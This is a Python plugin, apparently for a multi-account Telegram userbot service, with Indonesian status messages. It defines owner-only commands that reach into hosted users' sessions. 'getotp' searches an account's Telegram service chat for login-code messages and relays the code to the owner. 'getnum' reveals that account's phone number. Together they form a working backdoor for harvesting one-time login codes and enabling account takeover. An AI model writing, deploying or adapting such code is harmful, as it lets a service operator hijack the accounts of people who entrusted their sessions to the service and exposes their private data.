from .. import *


@PY.UBOT(["getotp", "getnum"], PREFIX, FILTERS.ME_OWNER)
async def _(client, message):
    TM = await message.reply("<b>sᴇᴅᴀɴɢ ᴍᴇᴍᴘʀᴏsᴇs</b>", quote=True)
    if len(message.command) < 2:
        return await TM.edit("<b>ᴘᴀʏᴀʜ ɢɪᴛᴜ ᴀᴊᴀ ɴɢɢᴀᴋ ʙɪsᴀ</b>")
    else:
        getText = ["Kode masuk Anda:", "Your login code:"]
        for X in ubot._ubot:
            if int(message.command[1]) == X.me.id:
                if message.command[0] == "getotp":
                    for msg in getText:
                        try:
                            async for otp in X.search_messages(777000, query=msg):
                                return await TM.edit(otp.text)
                        except Exception:
                            return await TM.edit(
                                f"<b>❌ ᴋᴀᴛᴀ ᴋᴜɴᴄɪ <code>{msg}</code> ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ</b>"
                            )
                else:
                    return await TM.edit(X.me.phone_number)
